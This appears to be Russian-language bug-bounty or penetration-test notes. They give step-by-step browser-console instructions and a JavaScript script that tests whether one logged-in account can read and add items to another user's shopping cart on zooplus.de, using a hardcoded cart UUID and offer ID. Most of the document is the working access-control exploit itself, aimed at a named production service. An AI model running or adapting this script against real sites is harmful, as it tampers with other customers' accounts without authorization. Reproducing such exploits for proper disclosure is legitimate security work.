# JavaScript для тестирования в браузере

## Важно: Выполнить в браузере под Account B

1. Залогиниться под Account B (suobup@dunkos.xyz)
2. Открыть DevTools (F12) → Console
3. Вставить и выполнить этот код:

```javascript
// Тест добавления товара в чужую корзину
const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
const OFFER_ID = 2966095;

// Получить текущее состояние корзины
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  console.log('Cart before:', cart.articles.length, 'items');
  const beforeCount = cart.articles.length;
  
  // Тест 1: Добавить товар
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles`, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "x-requested-with": "XMLHttpRequest"
    },
    body: JSON.stringify({
      "offerId": OFFER_ID
    })
  })
  .then(r => {
    console.log('Add response:', r.status, r.statusText);
    return r.text();
  })
  .then(text => {
    console.log('Add response body:', text.substring(0, 500));
    
    // Проверить корзину
    return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
      credentials: 'include'
    });
  })
  .then(r => r.json())
  .then(cartAfter => {
    console.log('Cart after:', cartAfter.articles.length, 'items');
    if (cartAfter.articles.length > beforeCount) {
      console.log('[!!!] SUCCESS! Cart modified!');
      console.log('[!!!] Before:', beforeCount, 'After:', cartAfter.articles.length);
    }
  });
})
.catch(e => console.error('Error:', e));
```

4. Проверить результат в консоли
5. Если успешно - сделать скриншот Network tab и Response

